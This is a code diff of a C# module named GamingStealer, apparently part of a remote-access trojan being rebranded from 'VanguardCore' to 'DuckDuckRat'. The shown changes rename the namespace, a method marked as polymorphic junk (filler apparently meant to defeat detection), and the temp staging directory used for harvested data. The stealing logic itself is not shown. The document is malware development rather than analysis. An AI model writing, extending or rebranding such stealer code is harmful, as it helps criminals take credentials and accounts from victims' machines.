@@ -4,12 +4,12 @@ using System.IO.Compression;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 
-namespace VanguardCore.Modules
+namespace DuckDuckRat.Modules
 {
     public static class GamingStealer
     {
         // [POLY_JUNK]
-        private static void _vanguard_g4m1ng_31337() {
+        private static void _DuckDuckRat_g4m1ng_31337() {
             int val = 99881;
             if (val > 100) Console.WriteLine("Harvesting...");
         }
@@ -24,7 +24,7 @@ namespace VanguardCore.Modules
 
         public static async Task<StealResult> Run()
         {
-            string workDir = Path.Combine(Path.GetTempPath(), "VanguardGaming_" + Guid.NewGuid().ToString("N").Substring(0, 6));
+            string workDir = Path.Combine(Path.GetTempPath(), "DUCK DUCK RAT v1Gaming_" + Guid.NewGuid().ToString("N").Substring(0, 6));
             Directory.CreateDirectory(workDir);
 
             int count = 0;
@@ -108,3 +108,5 @@ namespace VanguardCore.Modules
         }
     }
 }
+
+
